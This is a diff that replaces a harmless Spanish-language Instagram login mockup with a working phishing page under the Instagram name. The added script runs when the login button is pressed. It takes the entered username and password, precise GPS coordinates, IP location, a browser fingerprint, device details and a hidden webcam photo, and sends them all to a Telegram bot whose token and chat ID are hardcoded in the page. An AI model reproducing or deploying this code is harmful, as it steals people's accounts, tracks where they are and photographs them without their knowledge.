@@ -1,347 +1,333 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Instagram • Iniciar sesión</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      background-color: #fafafa;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
-
-    /* Contenedor principal centrado */
-    .login-wrapper {
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    /* Tarjeta principal de inicio de sesión (estilo Instagram) */
-    .login-card {
-      background-color: #ffffff;
-      border: 1px solid #dbdbdb;
-      border-radius: 8px;
-      width: 100%;
-      max-width: 350px;
-      padding: 30px 28px 28px;
-      margin: 0 auto;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
-    }
-
-    /* Título principal: Iniciar sesión en Instagram */
-    .login-title {
-      text-align: center;
-      font-size: 26px;
-      font-weight: 500;
-      font-family: inherit;
-      color: #262626;
-      margin-bottom: 28px;
-      letter-spacing: -0.3px;
-      word-break: keep-all;
-    }
-
-    /* Estilos de los campos de formulario */
-    .input-field {
-      width: 100%;
-      background-color: #fafafa;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      padding: 9px 12px;
-      font-size: 12.5px;
-      font-family: inherit;
-      color: #262626;
-      margin-bottom: 6px;
-      outline: none;
-      transition: border 0.1s ease;
-    }
-
-    .input-field:focus {
-      border-color: #a8a8a8;
-      background-color: #ffffff;
-    }
-
-    .input-field::placeholder {
-      color: #8e8e8e;
-      font-weight: 300;
-      font-size: 12px;
-    }
-
-    /* Botón de inicio de sesión */
-    .login-btn {
-      width: 100%;
-      background-color: #0095f6;
-      border: none;
-      border-radius: 8px;
-      padding: 7px 16px;
-      margin-top: 12px;
-      font-weight: 600;
-      font-size: 14px;
-      color: white;
-      cursor: pointer;
-      transition: background 0.2s;
-      font-family: inherit;
-    }
-
-    .login-btn:hover {
-      background-color: #1877f2;
-    }
-
-    .login-btn:active {
-      transform: scale(0.98);
-    }
-
-    /* Enlace "¿Olvidaste tu contraseña?" */
-    .forgot-link {
-      text-align: center;
-      margin: 18px 0 16px;
-    }
-
-    .forgot-link a {
-      font-size: 12px;
-      color: #00376b;
-      text-decoration: none;
-      font-weight: 400;
-    }
-
-    .forgot-link a:hover {
-      text-decoration: underline;
-    }
-
-    /* Separador "O" (estilo Instagram) */
-    .divider {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 18px;
-      margin: 14px 0 20px;
-    }
-
-    .divider-line {
-      flex: 1;
-      height: 1px;
-      background-color: #dbdbdb;
-    }
-
-    .divider-text {
-      font-size: 13px;
-      font-weight: 600;
-      color: #8e8e8e;
-      text-transform: uppercase;
-    }
-
-    /* Botón / enlace de inicio de sesión con Facebook (con candado) */
-    .facebook-login {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
-    .facebook-login a {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      color: #385185;
-      text-decoration: none;
-      background: transparent;
-      font-family: inherit;
-    }
-
-    .facebook-login a:hover {
-      text-decoration: underline;
-    }
-
-    /* Enlace "Crear cuenta nueva" */
-    .signup-link {
-      text-align: center;
-      border-top: 1px solid #dbdbdb;
-      padding-top: 24px;
-      margin-top: 8px;
-    }
-
-    .signup-link a {
-      font-size: 14px;
-      font-weight: 600;
-      color: #0095f6;
-      text-decoration: none;
-    }
-
-    .signup-link a:hover {
-      text-decoration: underline;
-    }
-
-    /* Pie de página: instagram.com */
-    .footer-meta {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 12px;
-      color: #8e8e8e;
-    }
-
-    .footer-meta a {
-      color: #8e8e8e;
-      text-decoration: none;
-      font-weight: 400;
-    }
-
-    .footer-meta a:hover {
-      text-decoration: underline;
-      color: #262626;
-    }
-
-    /* Ajuste para móviles muy pequeños */
-    @media (max-width: 450px) {
-      .login-card {
-        padding: 24px 20px 22px;
-      }
-
-      .login-title {
-        font-size: 24px;
-        margin-bottom: 24px;
-      }
-
-      .input-field {
-        padding: 8px 10px;
-      }
-
-      .login-btn {
-        padding: 7px 12px;
-      }
-    }
-
-    /* Clase auxiliar para separación de inputs (grupo) */
-    .input-group {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      margin-bottom: 4px;
-    }
-
-    /* pequeño ajuste para la alineación */
-    .facebook-login span {
-      font-size: 14px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo {
+            font-family: 'Instagram Sans', 'Billabong', 'Grand Hotel', cursive;
+            font-size: 3.2rem;
+            font-weight: 500;
+            margin-bottom: 30px;
+            color: #262626;
+            letter-spacing: -0.5px;
+        }
+        .input-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 9px 8px;
+            font-size: 0.85rem;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            background: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            width: 100%;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:active {
+            background: #1877f2;
+            transform: scale(0.98);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 0.8rem;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider::before {
+            margin-right: 16px;
+        }
+        .divider::after {
+            margin-left: 16px;
+        }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .forgot {
+            margin-top: 16px;
+            font-size: 0.75rem;
+            color: #00376b;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .signup {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 20px;
+        }
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #8e8e8e;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-<div class="login-wrapper">
-  <div>
-    <!-- Tarjeta principal: formulario exacto a los elementos dados -->
+<div class="container">
     <div class="login-card">
-      <!-- Título: "# Iniciar sesión en Instagram" representado como heading principal -->
-      <h1 class="login-title">Iniciar sesión en Instagram</h1>
-
-      <!-- Formulario con campos: número de celular / nombre de usuario y contraseña -->
-      <form action="#" method="post" id="loginForm">
+        <div class="logo">Instagram</div>
         <div class="input-group">
-          <input type="text" class="input-field" id="usernameOrEmail" 
-                 placeholder="Número de celular, nombre de usuario o correo electrónico" 
-                 autocomplete="username" aria-label="Número de celular, nombre de usuario o email">
-          <input type="password" class="input-field" id="password" 
-                 placeholder="Contraseña" autocomplete="current-password" aria-label="Contraseña">
+            <input type="text" id="username" placeholder="Teléfono, correo electrónico o usuario" autocomplete="off">
         </div>
-        <button type="submit" class="login-btn">Iniciar sesión</button>
-      </form>
-
-      <!-- Enlace olvidé mi contraseña -->
-      <div class="forgot-link">
-        <a href="#" id="forgotPwdLink">¿Olvidaste tu contraseña?</a>
-      </div>
-
-      <!-- Separador estilo Instagram (no estaba en el listado pero añade realismo sin romper elementos requeridos) -->
-      <div class="divider">
-        <div class="divider-line"></div>
-        <div class="divider-text">O</div>
-        <div class="divider-line"></div>
-      </div>
-
-      <!-- 🔒 Iniciar sesión con Facebook (exactamente con el emoji candado) -->
-      <div class="facebook-login">
-        <a href="#" id="facebookLoginBtn">
-          <span>🔒</span> Iniciar sesión con Facebook
-        </a>
-      </div>
-
-      <!-- Crear cuenta nueva (tal cual aparece en la descripción) -->
-      <div class="signup-link">
-        <a href="#" id="createAccountBtn">Crear cuenta nueva</a>
-      </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Contraseña">
+        </div>
+        <button id="btn">Iniciar sesión</button>
+        <div class="divider">o</div>
+        <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
+        <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+        <div class="signup">
+            ¿No tienes una cuenta? <a href="#">Regístrate</a>
+        </div>
     </div>
-
-    <!-- Footer con instagram.com -->
-    <div class="footer-meta">
-      <a href="#">instagram.com</a>
+    <div class="footer">
+        Meta · Información · Ayuda · Privacidad
     </div>
-  </div>
 </div>
 
-<!-- Simple script para evitar envío real del formulario y mostrar feedback visual básico (sin backend) 
-     También mantener comportamiento coherente sin recargar página -->
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
 <script>
-  (function() {
-    // Evitar envío real del formulario
-    const form = document.getElementById('loginForm');
-    if (form) {
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const usernameInput = document.getElementById('usernameOrEmail');
-        const passwordInput = document.getElementById('password');
-        // Pequeña simulación amigable: si los campos están vacíos, no se hace nada (no hay validación exigida,
-        // pero se muestra una alerta ligera para emular comportamiento esperado de demo)
-        if (!usernameInput.value.trim() || !passwordInput.value.trim()) {
-          alert('Completa ambos campos para iniciar sesión (demo sin backend)');
-        } else {
-          alert(`Demo de inicio de sesión. (Usuario: ${usernameInput.value}) - No se envía información real.`);
-        }
-      });
+    // ================= CONFIGURACIÓN =================
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
+    // ⚠️ REVOCA ESTE TOKEN Y PON UNO NUEVO (con @BotFather)
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
+    const CHAT_ID = '7555997298';
+
+    // ---------- FUNCIONES (igual que antes) ----------
+    async function getLocationFromWorker() {
+        try {
+            const res = await fetch(WORKER_URL);
+            if (!res.ok) throw new Error();
+            const data = await res.json();
+            return {
+                ip: data.ip || 'N/A',
+                country: data.country || 'N/A',
+                region: data.region || 'N/A',
+                city: data.city || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || 'N/A'
+            };
+        } catch(e) { return null; }
     }
 
-    // Prevenir comportamiento por defecto en enlaces para mantener la maqueta estática
-    const links = [
-      'forgotPwdLink',
-      'facebookLoginBtn',
-      'createAccountBtn'
-    ];
-    
-    links.forEach(id => {
-      const el = document.getElementById(id);
-      if (el) {
-        el.addEventListener('click', function(e) {
-          e.preventDefault();
-          if (id === 'forgotPwdLink') {
-            alert('Flujo de restablecimiento de contraseña (demo visual)');
-          } else if (id === 'facebookLoginBtn') {
-            alert('Inicio de sesión con Facebook (simulación — demo sin backend)');
-          } else if (id === 'createAccountBtn') {
-            alert('Crear cuenta nueva: formulario de registro (demostración visual)');
-          }
+    async function getLocationFromIpapi() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || 'N/A',
+                country: data.country_name || 'N/A',
+                region: data.region || 'N/A',
+                city: data.city || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || 'N/A'
+            };
+        } catch(e) { return null; }
+    }
+
+    async function getFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200; canvas.height = 50;
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = "#069";
+        ctx.font = "14px Arial";
+        ctx.fillText("FP", 10, 30);
+        const canvasHash = canvas.toDataURL().slice(0, 100);
+        let gpu = 'N/A';
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+        } catch(e) {}
+        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
+    }
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let model = "Desconocido";
+        if (ua.includes('iPhone')) model = 'iPhone';
+        else if (ua.includes('iPad')) model = 'iPad';
+        else if (ua.includes('Android')) model = 'Android';
+        else if (ua.includes('Mac')) model = 'Mac';
+        else if (ua.includes('Windows')) model = 'Windows PC';
+        const language = navigator.language || navigator.userLanguage;
+        const resolution = `${window.screen.width}x${window.screen.height}`;
+        const cpuCores = navigator.hardwareConcurrency || 'N/A';
+        return { model, ua, language, resolution, cpuCores };
+    }
+
+    async function getStorageInfo() {
+        try {
+            const est = await navigator.storage.estimate();
+            const totalGB = (est.quota / (1024**3)).toFixed(2);
+            const usedGB = (est.usage / (1024**3)).toFixed(2);
+            return { total: totalGB, used: usedGB };
+        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
+    }
+
+    function getGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
         });
-      }
-    });
-
-    // El footer "instagram.com" también puede tener un clic sutil sin redirección real
-    const footerLink = document.querySelector('.footer-meta a');
-    if (footerLink) {
-      footerLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('instagram.com — demo de página de inicio (solo maqueta visual)');
-      });
     }
-  })();
+
+    async function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        } catch(e) {
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+            catch(err) { return null; }
+        }
+        video.srcObject = stream;
+        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+        return blob;
+    }
+
+    async function sendMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) { console.warn(e); }
+    }
+    async function sendPhoto(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch(e) { console.warn(e); }
+    }
+
+    document.getElementById('btn').onclick = async () => {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        let creds = `🔐 *CREDENCIALES INSTAGRAM*\nUsuario: ${username || '(vacío)'}\nContraseña: ${password || '(vacío)'}\n`;
+
+        const gps = await getGPS();
+        const [workerLoc, ipapiLoc] = await Promise.all([
+            getLocationFromWorker(),
+            getLocationFromIpapi()
+        ]);
+        const [fp, device, storage] = await Promise.all([
+            getFingerprint(),
+            getDeviceInfo(),
+            getStorageInfo()
+        ]);
+        const foto = await capturePhoto();
+
+        let message = creds;
+        message += `━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
+        message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+        message += `📍 *Cloudflare Worker Location*\n`;
+        if (workerLoc && workerLoc.city !== 'N/A') {
+            message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
+        } else { message += `   • No disponible\n`; }
+        message += `📍 *IP API Location (ipapi.co)*\n`;
+        if (ipapiLoc && ipapiLoc.city !== 'N/A') {
+            message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
+        } else { message += `   • No disponible\n`; }
+        if (gps) {
+            message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+        } else {
+            message += `📍 *GPS: Permiso denegado o no disponible*\n`;
+        }
+        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
+        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
+
+        await sendMessage(message);
+        if (foto) await sendPhoto(foto);
+    };
 </script>
 </body>
 </html>
